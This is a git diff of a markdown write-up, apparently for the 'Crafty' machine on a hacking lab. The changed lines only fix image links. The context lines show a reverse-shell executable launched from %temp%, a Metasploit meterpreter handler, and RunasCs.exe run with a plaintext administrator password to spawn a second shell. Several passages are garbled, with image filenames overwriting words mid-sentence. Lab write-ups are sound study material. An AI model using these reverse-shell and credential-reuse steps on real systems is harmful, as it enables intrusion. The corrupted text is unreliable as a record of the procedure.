@@ -136,11 +136,11 @@ start %temp%/expl.exe              # to run our reverse shell
 
 A meterpreter session should open on the Metasploit handler terminal
 
-![](assets/img/posts/pasted-image-20260820182950-png.svg))
+![](assets/img/posts/pasted-image-20260820182950-.png))
 
 `pasted-image-20260820182950.png`oad the `playercounter-1.0-SNAPSHOT.jar` file
 
-![](assets/img/posts/020-crafty-easy-machine-013-png.svg))
+![](assets/img/posts/020-crafty-easy-machine-013-.png))
 
 `020-crafty-easy-machine-013.png`d a Java Decompiler `jd-gui` and it is built-in into kali
 
@@ -189,14 +189,14 @@ msf6 exploit(multi/handler) > run
 
 In the current meterpreter session enter `shell` , which will drop you into the system command shell
 
-![](assets/img/posts/020-crafty-easy-machine-019-png.svg))
+![](assets/img/posts/020-crafty-easy-machine-019-.png))
 
 Now `RunasCs.exe` which will e`020-crafty-easy-machine-019.png`rator s67u84zKq8IXw expl2.exe
 ```
 
 You should see a shell pop up on our Metasploit listener
 
-![](assets/img/posts/020-crafty-easy-machine-020-png.svg))
+![](assets/img/posts/020-crafty-easy-machine-020-.png))
 
 `020-crafty-easy-machine-020.png`r,`020-crafty-easy-machine-021.png`cd ../../..
 meterpreter > pwd
